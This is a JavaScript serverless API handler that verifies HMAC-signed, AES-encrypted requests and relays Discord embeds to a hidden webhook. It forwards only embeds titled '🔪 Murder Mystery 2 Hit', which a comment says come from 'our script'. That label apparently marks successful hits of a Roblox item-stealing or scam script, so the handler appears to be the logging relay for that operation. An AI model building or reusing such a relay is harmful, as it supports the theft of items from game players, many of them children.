import crypto from 'crypto'

export const config = { api: { bodyParser: false } }

function readRawBody(req) {
  return new Promise((resolve, reject) => {
    let data = ''
    req.on('data', c => { data += c })
    req.on('end', () => resolve(data))
    req.on('error', reject)
  })
}

export default async function handler(req, res) {
  if (req.method === 'GET') return res.status(200).send('OK')
  if (req.method !== 'POST') return res.status(405).send('zaml')

  const timestamp = req.headers['x-timestamp']
  const signature = req.headers['x-signature']
  if (!timestamp || !signature) return res.status(400).send('zaml')

  const age = Math.abs(Date.now() / 1000 - parseInt(timestamp))
  if (Number.isNaN(age) || age > 300) return res.status(400).send('zaml')

  const rawBody = await readRawBody(req)

  const expected = crypto
    .createHmac('sha256', process.env.SECRET_KEY)
    .update(`${timestamp}.${rawBody}`)
    .digest('base64')
  const a = Buffer.from(expected)
  const b = Buffer.from(signature)
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    return res.status(403).send('Bad request')
  }

  let wrapper
  try { wrapper = JSON.parse(rawBody) } catch { return res.status(400).send('zaml') }
  if (typeof wrapper.data !== 'string' || typeof wrapper.iv !== 'string') {
    return res.status(400).send('zaml')
  }

  let parsed
  try {
    const key = Buffer.from(process.env.ENC_KEY)          // 32 chars -> AES-256
    const iv = Buffer.from(wrapper.iv, 'base64')
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv)
    let dec = decipher.update(wrapper.data, 'base64', 'utf8')
    dec += decipher.final('utf8')
    parsed = JSON.parse(dec)
  } catch (e) {
    console.error('decrypt failed:', e.message)
    return res.status(400).send('zaml')
  }

  if (!parsed || typeof parsed !== 'object') return res.status(400).send('zaml')
  const { embeds, content, avatar_url, message_id } = parsed

  // must be a non-empty array of embed objects — blocks content-only sends
  // and anything that isn't our expected shape
  if (!Array.isArray(embeds) || embeds.length === 0 || embeds.length > 10) {
    return res.status(400).send('zaml')
  }
  for (const e of embeds) {
    if (!e || typeof e !== 'object' || Array.isArray(e)) {
      return res.status(400).send('zaml')
    }
  }

  // marker — only embeds our script produces are forwarded
  if (embeds[0].title !== '🔪 Murder Mystery 2 Hit') {
    return res.status(400).send('zaml')
  }

  const base = process.env.DISCORD_WEBHOOK_URL



  // edit an existing message
if (message_id) {
  if (typeof message_id !== 'string' || !/^\d+$/.test(message_id)) {
    return res.status(400).send('zaml')
  }
  await fetch(`${base}/messages/${message_id}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds })
  })
  return res.status(200).json({ ok: true })
}

  // new message — ?wait=true so Discord returns the created message (with its id)
  const r = await fetch(`${base}?wait=true`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: typeof content === 'string' ? content.slice(0, 2000) : '',
      embeds,
      avatar_url: typeof avatar_url === 'string' ? avatar_url : undefined,
    })
  })

  let id = null
  try { id = (await r.json()).id } catch {}

  return res.status(200).json({ ok: true, id })
}
